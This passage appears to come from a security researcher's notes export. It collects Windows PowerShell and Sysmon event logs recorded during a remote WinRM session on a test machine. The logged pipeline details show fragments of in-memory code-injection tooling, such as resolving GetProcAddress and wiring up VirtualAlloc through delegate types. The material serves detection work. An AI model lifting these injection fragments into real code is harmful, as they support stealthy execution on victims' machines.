</rich_text></node></node><node custom_icon_id="0" foreground="" is_bold="False" name="PowerShell Logs" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562063832.36" ts_lastsave="1562066163.78" unique_id="116"><rich_text></rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="2.1. 400 - Engine Lifecycle" prog_lang="xml" readonly="True" tags="" ts_creation="1562063952.48" ts_lastsave="1562063953.58" unique_id="117"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;PowerShell&quot; /&gt; 
      &lt;EventID Qualifiers=&quot;0&quot;&gt;400&lt;/EventID&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;4&lt;/Task&gt; 
      &lt;Keywords&gt;0x80000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T10:37:02.215819100Z&quot; /&gt; 
      &lt;EventRecordID&gt;32206&lt;/EventRecordID&gt; 
      &lt;Channel&gt;Windows PowerShell&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data&gt;Available&lt;/Data&gt; 
      &lt;Data&gt;None&lt;/Data&gt; 
      &lt;Data&gt;NewEngineState=Available PreviousEngineState=None SequenceNumber=13 HostName=ServerRemoteHost HostVersion=1.0.0.0 HostId=dc8d5623-1338-4792-877b-f6b912a94639 HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding EngineVersion=5.1.17763.316 RunspaceId=6f1ad315-c57d-48bf-bd87-139b31604fce PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine=&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.1. 400 - Engine Lifecycle" prog_lang="xml" readonly="True" tags="" ts_creation="1562068870.67" ts_lastsave="1562069120.09" unique_id="126"><rich_text> &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;PowerShell&quot; /&gt; 
      &lt;EventID Qualifiers=&quot;0&quot;&gt;400&lt;/EventID&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;4&lt;/Task&gt; 
      &lt;Keywords&gt;0x80000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T11:53:54.995877300Z&quot; /&gt; 
      &lt;EventRecordID&gt;48588&lt;/EventRecordID&gt; 
      &lt;Channel&gt;Windows PowerShell&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data&gt;Available&lt;/Data&gt; 
      &lt;Data&gt;None&lt;/Data&gt; 
      &lt;Data&gt;NewEngineState=Available PreviousEngineState=None SequenceNumber=13 HostName=ServerRemoteHost HostVersion=1.0.0.0 HostId=c94868ed-19fb-47c1-8d80-83ad870e9289 HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding EngineVersion=5.1.17763.316 RunspaceId=38221ea0-09e1-46af-b9a6-2471c5c2c816 PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine=&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.2. 800 - Pipeline Execution Details" prog_lang="xml" readonly="True" tags="" ts_creation="1562069161.61" ts_lastsave="1562069224.33" unique_id="127"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;PowerShell&quot; /&gt; 
      &lt;EventID Qualifiers=&quot;0&quot;&gt;800&lt;/EventID&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;8&lt;/Task&gt; 
      &lt;Keywords&gt;0x80000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T11:53:55.446425300Z&quot; /&gt; 
      &lt;EventRecordID&gt;48589&lt;/EventRecordID&gt; 
      &lt;Channel&gt;Windows PowerShell&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data&gt;$Win32Functions = New-Object System.Object&lt;/Data&gt; 
      &lt;Data&gt;DetailSequence=1 DetailTotal=1 SequenceNumber=15 UserId=MSEDGEWIN10\IEUser HostName=ServerRemoteHost HostVersion=1.0.0.0 HostId=c94868ed-19fb-47c1-8d80-83ad870e9289 HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding EngineVersion=5.1.17763.316 RunspaceId=38221ea0-09e1-46af-b9a6-2471c5c2c816 PipelineId=1 ScriptName= CommandLine= $Win32Functions = New-Object System.Object&lt;/Data&gt; 
      &lt;Data&gt;CommandInvocation(New-Object): &quot;New-Object&quot; ParameterBinding(New-Object): name=&quot;TypeName&quot;; value=&quot;System.Object&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.3. 800 - Pipeline Execution Details" prog_lang="xml" readonly="True" tags="" ts_creation="1562069233.59" ts_lastsave="1562069351.11" unique_id="128"><rich_text>+ &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;PowerShell&quot; /&gt; 
      &lt;EventID Qualifiers=&quot;0&quot;&gt;800&lt;/EventID&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;8&lt;/Task&gt; 
      &lt;Keywords&gt;0x80000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T11:53:55.575699700Z&quot; /&gt; 
      &lt;EventRecordID&gt;48590&lt;/EventRecordID&gt; 
      &lt;Channel&gt;Windows PowerShell&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data&gt;Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }&lt;/Data&gt; 
      &lt;Data&gt;DetailSequence=1 DetailTotal=1 SequenceNumber=17 UserId=MSEDGEWIN10\IEUser HostName=ServerRemoteHost HostVersion=1.0.0.0 HostId=c94868ed-19fb-47c1-8d80-83ad870e9289 HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding EngineVersion=5.1.17763.316 RunspaceId=38221ea0-09e1-46af-b9a6-2471c5c2c816 PipelineId=1 ScriptName= CommandLine= Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }&lt;/Data&gt; 
      &lt;Data&gt;CommandInvocation(Where-Object): &quot;Where-Object&quot; ParameterBinding(Where-Object): name=&quot;FilterScript&quot;; value=&quot; $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') &quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;Microsoft.Management.Infrastructure, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;System.Management, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;System.DirectoryServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;System.Numerics, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;Anonymously Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;Microsoft.PowerShell.Security, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;System.Transactions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;PSEventHandler, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;Microsoft.PowerShell.Commands.Utility, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot; ParameterBinding(Where-Object): name=&quot;InputObject&quot;; value=&quot;System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.4. 800 - Pipeline Execution Details" prog_lang="xml" readonly="True" tags="" ts_creation="1562069239.53" ts_lastsave="1562069375.53" unique_id="129"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;PowerShell&quot; /&gt; 
      &lt;EventID Qualifiers=&quot;0&quot;&gt;800&lt;/EventID&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;8&lt;/Task&gt; 
      &lt;Keywords&gt;0x80000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T11:53:55.607890100Z&quot; /&gt; 
      &lt;EventRecordID&gt;48591&lt;/EventRecordID&gt; 
      &lt;Channel&gt;Windows PowerShell&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data&gt;$tmpPtr = New-Object IntPtr&lt;/Data&gt; 
      &lt;Data&gt;DetailSequence=1 DetailTotal=1 SequenceNumber=19 UserId=MSEDGEWIN10\IEUser HostName=ServerRemoteHost HostVersion=1.0.0.0 HostId=c94868ed-19fb-47c1-8d80-83ad870e9289 HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding EngineVersion=5.1.17763.316 RunspaceId=38221ea0-09e1-46af-b9a6-2471c5c2c816 PipelineId=1 ScriptName= CommandLine= $tmpPtr = New-Object IntPtr&lt;/Data&gt; 
      &lt;Data&gt;CommandInvocation(New-Object): &quot;New-Object&quot; ParameterBinding(New-Object): name=&quot;TypeName&quot;; value=&quot;IntPtr&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.5. 800 - Pipeline Execution Details" prog_lang="xml" readonly="True" tags="" ts_creation="1562069242.66" ts_lastsave="1562069396.93" unique_id="130"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;PowerShell&quot; /&gt; 
      &lt;EventID Qualifiers=&quot;0&quot;&gt;800&lt;/EventID&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;8&lt;/Task&gt; 
      &lt;Keywords&gt;0x80000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T11:53:55.607890100Z&quot; /&gt; 
      &lt;EventRecordID&gt;48592&lt;/EventRecordID&gt; 
      &lt;Channel&gt;Windows PowerShell&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data&gt;$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)&lt;/Data&gt; 
      &lt;Data&gt;DetailSequence=1 DetailTotal=1 SequenceNumber=21 UserId=MSEDGEWIN10\IEUser HostName=ServerRemoteHost HostVersion=1.0.0.0 HostId=c94868ed-19fb-47c1-8d80-83ad870e9289 HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding EngineVersion=5.1.17763.316 RunspaceId=38221ea0-09e1-46af-b9a6-2471c5c2c816 PipelineId=1 ScriptName= CommandLine= $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)&lt;/Data&gt; 
      &lt;Data&gt;CommandInvocation(New-Object): &quot;New-Object&quot; ParameterBinding(New-Object): name=&quot;TypeName&quot;; value=&quot;System.Runtime.InteropServices.HandleRef&quot; ParameterBinding(New-Object): name=&quot;ArgumentList&quot;; value=&quot;0, 140731994406912&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.6. 800 - Pipeline Execution Details" prog_lang="xml" readonly="True" tags="" ts_creation="1562069243.13" ts_lastsave="1562069423.35" unique_id="131"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;PowerShell&quot; /&gt; 
      &lt;EventID Qualifiers=&quot;0&quot;&gt;800&lt;/EventID&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;8&lt;/Task&gt; 
      &lt;Keywords&gt;0x80000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T11:53:55.607890100Z&quot; /&gt; 
      &lt;EventRecordID&gt;48593&lt;/EventRecordID&gt; 
      &lt;Channel&gt;Windows PowerShell&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data&gt;Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))&lt;/Data&gt; 
      &lt;Data&gt;DetailSequence=1 DetailTotal=1 SequenceNumber=23 UserId=MSEDGEWIN10\IEUser HostName=ServerRemoteHost HostVersion=1.0.0.0 HostId=c94868ed-19fb-47c1-8d80-83ad870e9289 HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding EngineVersion=5.1.17763.316 RunspaceId=38221ea0-09e1-46af-b9a6-2471c5c2c816 PipelineId=1 ScriptName= CommandLine= Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))&lt;/Data&gt; 
      &lt;Data&gt;CommandInvocation(Write-Output): &quot;Write-Output&quot; ParameterBinding(Write-Output): name=&quot;InputObject&quot;; value=&quot;140731994514944&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.7. 800 - Pipeline Execution Details" prog_lang="xml" readonly="True" tags="" ts_creation="1562069243.59" ts_lastsave="1562069528.74" unique_id="132"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;PowerShell&quot; /&gt; 
      &lt;EventID Qualifiers=&quot;0&quot;&gt;800&lt;/EventID&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;8&lt;/Task&gt; 
      &lt;Keywords&gt;0x80000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T11:53:55.654846300Z&quot; /&gt; 
      &lt;EventRecordID&gt;48595&lt;/EventRecordID&gt; 
      &lt;Channel&gt;Windows PowerShell&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data&gt;Write-Output $TypeBuilder.CreateType()&lt;/Data&gt; 
      &lt;Data&gt;DetailSequence=1 DetailTotal=1 SequenceNumber=27 UserId=MSEDGEWIN10\IEUser HostName=ServerRemoteHost HostVersion=1.0.0.0 HostId=c94868ed-19fb-47c1-8d80-83ad870e9289 HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding EngineVersion=5.1.17763.316 RunspaceId=38221ea0-09e1-46af-b9a6-2471c5c2c816 PipelineId=1 ScriptName= CommandLine= Write-Output $TypeBuilder.CreateType()&lt;/Data&gt; 
      &lt;Data&gt;CommandInvocation(Write-Output): &quot;Write-Output&quot; ParameterBinding(Write-Output): name=&quot;InputObject&quot;; value=&quot;MyDelegateType&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.8. 800 - Pipeline Execution Details" prog_lang="xml" readonly="True" tags="" ts_creation="1562069244.28" ts_lastsave="1562069568.91" unique_id="133"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;PowerShell&quot; /&gt; 
      &lt;EventID Qualifiers=&quot;0&quot;&gt;800&lt;/EventID&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;8&lt;/Task&gt; 
      &lt;Keywords&gt;0x80000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T11:53:55.672009400Z&quot; /&gt; 
      &lt;EventRecordID&gt;48596&lt;/EventRecordID&gt; 
      &lt;Channel&gt;Windows PowerShell&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data&gt;$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc&lt;/Data&gt; 
      &lt;Data&gt;DetailSequence=1 DetailTotal=1 SequenceNumber=29 UserId=MSEDGEWIN10\IEUser HostName=ServerRemoteHost HostVersion=1.0.0.0 HostId=c94868ed-19fb-47c1-8d80-83ad870e9289 HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding EngineVersion=5.1.17763.316 RunspaceId=38221ea0-09e1-46af-b9a6-2471c5c2c816 PipelineId=1 ScriptName= CommandLine= $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc&lt;/Data&gt; 
      &lt;Data&gt;CommandInvocation(Add-Member): &quot;Add-Member&quot; ParameterBinding(Add-Member): name=&quot;Name&quot;; value=&quot;VirtualAlloc&quot; ParameterBinding(Add-Member): name=&quot;Value&quot;; value=&quot;MyDelegateType&quot; ParameterBinding(Add-Member): name=&quot;MemberType&quot;; value=&quot;NoteProperty&quot; ParameterBinding(Add-Member): name=&quot;InputObject&quot;; value=&quot;System.Object&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node></node><node custom_icon_id="0" foreground="" is_bold="False" name="Sysmon Logs" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562066163.79" ts_lastsave="1562076398.01" unique_id="122"><rich_text></rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="2.1. 1 - Process Create (rule: ProcessCreate)" prog_lang="xml" readonly="True" tags="" ts_creation="1562066470.34" ts_lastsave="1562066477.93" unique_id="123"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Sysmon&quot; Guid=&quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot; /&gt; 
      &lt;EventID&gt;1&lt;/EventID&gt; 
      &lt;Version&gt;5&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;1&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T11:15:08.219472100Z&quot; /&gt; 
      &lt;EventRecordID&gt;2518&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;3244&quot; ThreadID=&quot;4020&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-18&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;RuleName&quot; /&gt; 
      &lt;Data Name=&quot;UtcTime&quot;&gt;2019-07-02 11:15:08.217&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessGuid&quot;&gt;{747f3d96-3cbc-5d1b-0000-001069ff0501}&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;3288&lt;/Data&gt; 
      &lt;Data Name=&quot;Image&quot;&gt;C:\Windows\System32\wsmprovhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;FileVersion&quot;&gt;10.0.17763.1 (WinBuild.160101.0800)&lt;/Data&gt; 
      &lt;Data Name=&quot;Description&quot;&gt;Host process for WinRM plug-ins&lt;/Data&gt; 
      &lt;Data Name=&quot;Product&quot;&gt;Microsoft® Windows® Operating System&lt;/Data&gt; 
      &lt;Data Name=&quot;Company&quot;&gt;Microsoft Corporation&lt;/Data&gt; 
      &lt;Data Name=&quot;OriginalFileName&quot;&gt;wsmprovhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;CommandLine&quot;&gt;C:\Windows\system32\wsmprovhost.exe -Embedding&lt;/Data&gt; 
      &lt;Data Name=&quot;CurrentDirectory&quot;&gt;C:\Windows\system32\&lt;/Data&gt; 
      &lt;Data Name=&quot;User&quot;&gt;MSEDGEWIN10\IEUser&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{747f3d96-3cbc-5d1b-0000-002027ff0501}&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonId&quot;&gt;0x105ff27&lt;/Data&gt; 
      &lt;Data Name=&quot;TerminalSessionId&quot;&gt;0&lt;/Data&gt; 
      &lt;Data Name=&quot;IntegrityLevel&quot;&gt;High&lt;/Data&gt; 
      &lt;Data Name=&quot;Hashes&quot;&gt;MD5=AB4AB98654635CABADB5F1A60BDA1C05,SHA256=5FCCFF57D379CDC4CF6196FEF554CEF753B4C76DC315F371F90AEBF07B6A18C3&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{00000000-0000-0000-0000-000000000000}&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentProcessId&quot;&gt;840&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentImage&quot;&gt;?&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentCommandLine&quot;&gt;?&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="2.2. 11 - File created (rule: FileCreate)" prog_lang="xml" readonly="True" tags="" ts_creation="1562066510.99" ts_lastsave="1562066531.72" unique_id="124"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Sysmon&quot; Guid=&quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot; /&gt; 
      &lt;EventID&gt;11&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;11&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T11:15:08.261713600Z&quot; /&gt; 
      &lt;EventRecordID&gt;2519&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;3244&quot; ThreadID=&quot;4020&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-18&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;RuleName&quot; /&gt; 
      &lt;Data Name=&quot;UtcTime&quot;&gt;2019-07-02 11:15:08.251&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessGuid&quot;&gt;{747f3d96-3cbc-5d1b-0000-001069ff0501}&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;3288&lt;/Data&gt; 
      &lt;Data Name=&quot;Image&quot;&gt;C:\Windows\system32\wsmprovhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetFilename&quot;&gt;C:\Users\IEUser\AppData\Local\Temp\__PSScriptPolicyTest_ntavurb4.bur.ps1&lt;/Data&gt; 
      &lt;Data Name=&quot;CreationUtcTime&quot;&gt;2019-07-02 11:15:08.251&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.1. 1 - Process Create (rule: ProcessCreate)" prog_lang="xml" readonly="True" tags="" ts_creation="1562069847.96" ts_lastsave="1562069939.2" unique_id="134"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Sysmon&quot; Guid=&quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot; /&gt; 
      &lt;EventID&gt;1&lt;/EventID&gt; 
      &lt;Version&gt;5&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;1&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T12:13:30.527395200Z&quot; /&gt; 
      &lt;EventRecordID&gt;2619&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;3244&quot; ThreadID=&quot;4020&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-18&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;RuleName&quot; /&gt; 
      &lt;Data Name=&quot;UtcTime&quot;&gt;2019-07-02 12:13:30.523&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessGuid&quot;&gt;{747f3d96-4a6a-5d1b-0000-00105be63401}&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;6308&lt;/Data&gt; 
      &lt;Data Name=&quot;Image&quot;&gt;C:\Windows\System32\wsmprovhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;FileVersion&quot;&gt;10.0.17763.1 (WinBuild.160101.0800)&lt;/Data&gt; 
      &lt;Data Name=&quot;Description&quot;&gt;Host process for WinRM plug-ins&lt;/Data&gt; 
      &lt;Data Name=&quot;Product&quot;&gt;Microsoft® Windows® Operating System&lt;/Data&gt; 
      &lt;Data Name=&quot;Company&quot;&gt;Microsoft Corporation&lt;/Data&gt; 
      &lt;Data Name=&quot;OriginalFileName&quot;&gt;wsmprovhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;CommandLine&quot;&gt;C:\Windows\system32\wsmprovhost.exe -Embedding&lt;/Data&gt; 
      &lt;Data Name=&quot;CurrentDirectory&quot;&gt;C:\Windows\system32\&lt;/Data&gt; 
      &lt;Data Name=&quot;User&quot;&gt;MSEDGEWIN10\IEUser&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{747f3d96-4430-5d1b-0000-002033de1e01}&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonId&quot;&gt;0x11ede33&lt;/Data&gt; 
      &lt;Data Name=&quot;TerminalSessionId&quot;&gt;0&lt;/Data&gt; 
      &lt;Data Name=&quot;IntegrityLevel&quot;&gt;High&lt;/Data&gt; 
